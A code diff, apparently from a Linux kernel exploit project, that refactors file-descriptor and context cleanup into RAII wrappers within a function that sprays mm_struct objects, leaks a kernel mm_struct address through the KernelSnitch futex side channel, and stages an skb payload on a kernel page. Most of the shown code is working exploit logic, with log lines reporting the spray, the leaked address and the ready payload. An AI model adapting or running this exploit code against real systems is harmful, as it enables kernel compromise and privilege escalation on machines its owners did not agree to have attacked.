@@ -1,5 +1,6 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include "support/native_resource.hpp"
 #include "target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
@@ -17,9 +18,9 @@ static const struct kernel_offsets *profile_values(void) {
   return target_profile_values(&g_target_profile);
 }
 
-/* Decoupling plan: compute elapsed monotonic time. Input: reference timestamp;
- * output: milliseconds. Future: shared_elapsed_ms(const struct timespec *). */
-static long long ms_since(struct timespec *t0) {
+/* Decoupling plan: compute elapsed monotonic time. Input: const reference
+ * timestamp; output: milliseconds. Future: shared_elapsed_ms(const timespec *). */
+static long long ms_since(const struct timespec *t0) {
   return (long long)runtime_elapsed_ms(t0);
 }
 
@@ -49,13 +50,13 @@ void read_first_line(const char *path, char *buf, size_t len) {
     return;
   }
   snprintf(buf, len, "unreadable");
-  int fd = open(path, O_RDONLY | O_CLOEXEC);
-  if (fd < 0) {
+  ghostlock::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
+  if (!fd.valid()) {
     return;
   }
-  ssize_t n = read(fd, buf, len - 1);
-  int saved_errno = errno;
-  close(fd);
+  const ssize_t n = read(fd.get(), buf, len - 1);
+  const int saved_errno = errno;
+  fd.reset();
   if (n <= 0) {
     errno = saved_errno;
     snprintf(buf, len, "unreadable");
@@ -524,8 +525,13 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_context_init(
+  ghostlock::KernelSnitchOwner snitch = ghostlock::KernelSnitchOwner::create(
       mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
+  /* The forked leak child borrows the shared mmap context through this
+   * compatibility alias; the owner remains the only releaser. */
+  auto clear_snitch_alias =
+      ghostlock::make_scope_exit([]() noexcept { ks = NULL; });
+  ks = snitch.get();
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -601,10 +607,9 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
       pr_warning("leak child exit status=%d\n", leak_status);
     }
   }
-  if (!kernelsnitch_context_has_collisions(ks)) {
+  if (!snitch.has_collisions()) {
     pr_warning("[spray] futex collisions not found\n");
-    kernelsnitch_context_destroy(ks);
-    ks = NULL;
+    snitch.reset();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -614,10 +619,10 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
 
   pr_info("[spray] futex collisions found +%lldms\n",
           ms_since(&t_spray));
-  (void)kernelsnitch_context_scan(ks);
+  (void)snitch.scan();
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
-          kernelsnitch_context_result(ks), ms_since(&t_spray));
-  uintptr_t leaked = kernelsnitch_context_result(ks);
+          snitch.result(), ms_since(&t_spray));
+  uintptr_t leaked = snitch.result();
   /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
   leaked |= (uintptr_t)0xf << 56;
   last_mm_struct = leaked;
@@ -626,8 +631,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
       leaked < KERNELSNITCH_IDENTITY_START ||
       leaked >= g_direct_map_end) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
-    kernelsnitch_context_destroy(ks);
-    ks = NULL;
+    snitch.reset();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -637,8 +641,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   if (!prepare_skb_payload(base, request)) {
-    kernelsnitch_context_destroy(ks);
-    ks = NULL;
+    snitch.reset();
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
@@ -703,8 +706,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
     }
   }
   pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
-  kernelsnitch_context_destroy(ks);
-  ks = NULL;
+  snitch.reset();
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     SYSCHK(close(prepare_ctx.memfds[i]));
